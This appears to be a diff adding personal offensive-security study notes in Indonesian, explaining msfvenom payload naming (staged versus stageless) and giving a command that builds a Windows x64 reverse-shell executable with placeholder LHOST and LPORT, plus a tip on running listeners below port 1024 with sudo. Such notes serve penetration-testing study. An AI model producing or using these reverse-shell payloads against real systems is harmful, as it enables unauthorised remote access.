@@ -1,0 +1,23 @@
+[+] UNTUK RUN LISTENER DENGAN PORT DIBAWAH 1024, PERLU RUN MENGGUNAKAN SUDO
+
+
+pemilihan payload untuk msfvenom adalah seperti beriktu
+OS/ARCH/PAYLOAD
+linux/x64/shell_reverse_tcp  <-- contoh
+
+kecuali windows 32bit, menggunakan OS/PAYLOAD
+
+`shell_reverse_tcp` berarti STAGELESS karena dilambangkan `_` setelah shell
+`shell/reverse_tcp` berarti STAGED karena dilambangkan `/` setelah shell
+
+juga berlaku di meterpreter payload
+`windows/x64/meterpreter/reverse_tcp`  <------- STAGED
+`linux/x86/meterpreter_reverse_tcp`    <------- STAGELESS
+
+
+
+
+generate Win x64 revshell ke exe format:
+- msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=LOCAL-IP LPORT=LOCAL-PORT
+[+] -f : format
+[+] -o : output file
